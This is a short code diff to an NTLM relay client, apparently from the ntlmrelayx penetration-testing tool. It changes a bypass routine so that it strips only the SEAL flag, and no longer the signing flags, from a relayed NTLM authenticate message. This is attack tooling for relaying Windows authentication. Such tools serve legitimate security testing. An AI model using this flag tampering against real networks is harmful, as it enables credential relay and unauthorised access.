@@ -106,16 +106,13 @@ class HTTPRelayClient(ProtocolClient):
         else:
             token = authenticateMessageBlob
 
-        # When exploiting NTLM local authentication bypass, remove SIGN/SEAL but keep MIC/Version intact
+        # When exploiting NTLM local authentication bypass, remove SEAL only for HTTP->HTTPS relay
         if self.serverConfig.remove_mic_partial:
             authMessage = NTLMAuthChallengeResponse()
             authMessage.fromString(token)
-            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
-                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
-            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
-                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
+            # Do NOT remove SIGN or ALWAYS_SIGN - keep signing flags for HTTP
             # Do NOT remove KEY_EXCH or VERSION flags
             # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
             token = authMessage.getData()
